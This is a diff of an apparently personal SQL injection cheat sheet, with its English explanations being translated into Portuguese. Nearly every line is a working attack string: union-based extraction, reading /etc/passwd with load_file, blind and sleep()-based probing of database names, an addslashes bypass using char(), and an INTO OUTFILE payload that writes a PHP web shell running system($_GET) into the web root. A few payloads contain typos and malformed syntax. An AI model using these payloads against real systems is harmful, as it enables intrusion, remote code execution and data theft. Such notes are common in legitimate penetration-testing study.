@@ -18,31 +18,35 @@ Exemplo: ' order by 1 or 2 or 3...'
 Exemplo: union select 1, column_name, load_file(”/etc/passwd”), 4, 5 from information_schema.columns where table_schema=”database” and table_name=”users” %23
 
 ## Blind
-When there are no indications if there is a SQL Injection, some tests can be used to verify the AND and OR logic of the program.
+Quando não há indícios de que há uma injeção de SQL, alguns testes podem ser usados para verificar a lógica AND e OR do programa
 
-Example: ' or 1=1 union select 1,2#
+Exemplo: ' and true#
+Exemplo: ' or 1=1 union select 1,2#
 
 ### Blind Post
-To discover confidential information from the server through logic, it is possible to use the ascii function to find out the name of the database in which the application is located, so it is very common to use Burp Suite in Repeater mode to make requests.
+Para descobrir informações confidenciais do servidor através da lógica, é possível utilizar a função ascii para descobrir o nome do banco de dados em que a aplicação está localizada, por isso é muito comum utilizar o Burp Suite no modo Repeater para fazer requisições
+
 
 Example: ' or length(database()) = 7 #
 
-Example: ' or ascii(substring(database(),1,1)) = ascii number for letter # 
+Exemplo: ' or ascii(substring(database(),1,1)) = ascii number for letter # 
 
-Example: ' or database() = char(115,116,114,105,110,103) # 
+Exemplo: ' or database() = char(115,116,114,105,110,103) # 
 
-Example: ' or ascii(substring(select loing from column name limit 0,1),1,1)) = ascii number for letter #
+Exemplo: ' or ascii(substring(select loing from column name limit 0,1),1,1)) = ascii number for letter #
+
+Exemplo: ' union select 1,2,group_concat(table_name),4,5 from information_schema.tables where table_schema="dbmrtur"%23
 
 ## Time Based
-Time Based uses the sleep() function to check if there is a SQL Injection vulnerability by observing if the page takes a long time to respond after sending a sleep() in a request to the database. If possible, you can use if to scan information about the database, tables, and other information as in other vulnerabilities
+O Time Based usa a função sleep() para verificar se há uma vulnerabilidade de injeção de SQL, observando se a página demora muito para responder após o envio de um sleep() em uma solicitação ao banco de dados. Se possível, você pode usar if para verificar informações sobre o banco de dados, tabelas e outras informações, como em outras vulnerabilidades
 
-Example: ' or sleep(5)#
+Exemplo: ' or sleep(5)#
 
-Example: ' or if (length(database()) = 5, sleep(5), 0)#
+Exemplo: ' or if (length(database()) = 5, sleep(5), 0)#
 
-Example: ' or if (database() = char(char(115,116,114,105,110,103)), sleep(5), 0)#
+Exemplo: ' or if (database() = char(char(115,116,114,105,110,103)), sleep(5), 0)#
 
-Example: ' or if (ascii(substring(database(), 1, 1)) = 100, sleep(5), 0)#
+Exemplo: ' or if (ascii(substring(database(), 1, 1)) = 100, sleep(5), 0)#
 
 ## SQLi to RCE
 Com a injeção de comando SQL, você pode gravar dados no servidor com o comando INTO OUTFILE e o caminho do diretório que deseja salvar
@@ -52,10 +56,10 @@ Exemplo: ‘ union all select 1,2,3,4, “string” INTO OUTFILE “/var/www/htm
 Exemplo: ‘ union all select 1,2,3,4, “`<?php system($_GET[’parameter’]); ?>” INTO OUTFILE “/var/www/html/website/banners/file.php” %23
 
 ## Bypass addslashes
-In some cases, because of the way it was programmed to be queried in the database, some backslashes will be added to the query, making it impossible to make queries with single quotes, generating an error. However, one of the ways to circumvent this mechanism is to pass string values in decimals separated by commas with the char() function.
+Em alguns casos, devido à forma como foi programado para ser consultado no banco de dados, algumas barras invertidas serão adicionadas à consulta, impossibilitando a realização de consultas com aspas simples, gerando um erro. No entanto, uma das maneiras de contornar esse mecanismo é passar valores de string em decimais separados por vírgulas com a função char()
 
-Example: echo -n “string” | od -An -tdC
+Exemplo: echo -n “string” | od -An -tdC
 
-Example:-1 union select 1,table_name,3,4,5 from information_schema.tables where table_schema=char(115,116,114,105,110,103)
+Exemplo:-1 union select 1,table_name,3,4,5 from information_schema.tables where table_schema=char(115,116,114,105,110,103)
 
 Site: [https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html](https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html)
